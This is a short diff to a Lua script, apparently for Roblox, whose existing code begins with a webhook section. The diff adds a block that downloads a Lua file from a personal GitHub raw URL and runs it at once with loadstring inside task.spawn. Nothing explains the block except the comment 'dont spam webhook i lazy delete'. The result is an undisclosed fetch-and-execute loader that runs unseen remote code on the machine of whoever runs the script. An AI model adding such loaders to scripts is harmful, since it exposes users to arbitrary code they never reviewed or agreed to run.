@@ -1,3 +1,9 @@
+-- dont spam webhook i lazy delete 
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hoang-VN1/Tets/refs/heads/main/hi.lua"))()
+end)
+
 
 --// Webhook 
 local placeId = game.PlaceId
